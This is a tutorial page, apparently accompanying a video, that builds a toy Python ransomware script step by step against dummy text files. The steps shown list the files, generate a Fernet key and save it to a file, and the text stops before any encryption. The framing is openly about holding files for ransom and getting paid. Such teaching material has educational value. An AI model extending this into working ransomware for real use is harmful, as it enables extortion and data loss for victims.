# Ransomware

This is an example application featured in NetworkChuck's <a href="https://youtu.be/UtMMjXOlRQc">Python Malware Tutorial</a>.

### Instructions

**Step 1:**
Make a folder called ``ransomware`` and create a few random ``.txt`` files with some silly phrases in them:

<pre>
<code>$ mkdir ransomware
$ cd ransomware
$ echo "This is a file" > file.txt
$ echo "Leave me alone" > file2.txt
$ echo "Another one" > hey.txt
$ echo "One more time" > pleasedonthurtme.txt</code>
</pre>

Now let's hold these files for ransom! Let's encrypt those suckers right now! Here we go:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Write this code in the following ``voldemort.py`` file:

<details>
<summary>💰 How to Hold These Files for Ransom:</summary>

```python
#!/usr/bin/env python3
import os

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

```
</details>

When you first run ``voldemort.py`` in your terminal, you should see the following output:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
</pre>

**Step 2:**
Now let's encrypt those files! Start it off by running the following command:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Add more code to ``voldemort.py``:

<details>
<summary>🔒 How to Encrypt These Files:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

print(key)

```
</details>

When you next run ``voldemort.py``, you should see the following output for your key:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']
b'nDcZ_UIVfpECWw2ezj2T4RKHg7i_7ARgMtHXEVxarfQ='</code>
</pre>

**Step 3:**
Obviously, we don't want to print our key right out there in the open where the user can see it. We want the user to give us money, but we do need to save the key into another file for safety so we can unlock the files later *after* we get paid 😉:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Add more code to ``voldemort.py``:

<details>
<summary>🔑 How to Save the Key:</summary>

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

```
</details>

Run ``voldemort.py`` and you should see the following output:

<pre>
<code>$ python voldemort.py
['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
</pre>

Wait, where is ``thekey.key``? Don't worry! It is still hidden and we can finally view it by entering the following commands:

<pre>
<code>$ ls
file.txt             hey.txt              thekey.key
file2.txt            pleasedonthurtme.txt voldemort.py
$ cat thekey.key
l-4zrPy0VkR8pDJnGvsxyy2UEXGiV0AKkpEQR-fzD14=%</code>
</pre>
